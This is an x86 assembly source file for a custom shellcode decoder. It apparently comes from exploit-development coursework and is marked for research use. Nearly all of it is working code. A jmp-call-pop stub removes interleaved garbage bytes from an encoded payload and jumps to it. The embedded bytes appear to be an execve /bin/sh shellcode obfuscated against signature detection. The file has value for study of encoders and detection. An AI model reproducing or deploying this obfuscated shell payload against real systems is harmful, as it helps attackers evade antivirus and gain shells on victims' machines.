; Custom Shellcode decoder
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi                     ; beginning of the encoded shellcode
	lea edi, [esi]              ; shellcode decoded in place. Edi - dest pointer
	xor eax, eax            
	mov al, byte [esi]          ; position of next garbage byte
	xor ebx, ebx
    push 1                      ; index into the shellcode
    pop ecx

decode: 
    cmp ecx, eax
    jnz short shellcode_byte    ; shellcode byte found 
    add ecx, 2                  ; garbage byte found. Advance 2 bytes
    mov al, byte [esi + eax + 1]; position of next garbage byte    
shellcode_byte:                 ; byte part of real shellcode
	mov bl, byte [esi + ecx]
	mov byte [edi], bl
	inc edi                     ; advance destination
	inc ecx                     ; advance source
	cmp byte [esi + ecx], 0xf0  ; check for END marker
    jnz decode
    cmp byte [esi + ecx + 1], 0x0d
    jnz decode
    jmp esi                     ; shellcode decoded in-place. Jump to it



call_shellcode:

	call decoder
	EncodedShellcode: db 0x04,0x31,0xc0,0x50,0x06,0x08,0x68,0x2f,0x15,0x0b,0x2f,0x12,0x0e,0x73,0x85,0x11,0x68,0x4e,0x14,0x68,0x96,0x18,0x2f,0x62,0xd8,0x1c,0x69,0x6e,0xf9,0x20,0x89,0xe3,0xa9,0x23,0x50,0x6d,0x26,0x89,0x60,0x29,0xe2,0x0e,0x2d,0x53,0x89,0x3b,0x30,0xe1,0xaa,0x34,0xb0,0x0b,0x55,0x37,0xcd,0xe2,0x3b,0x80,0xf0,0x0d
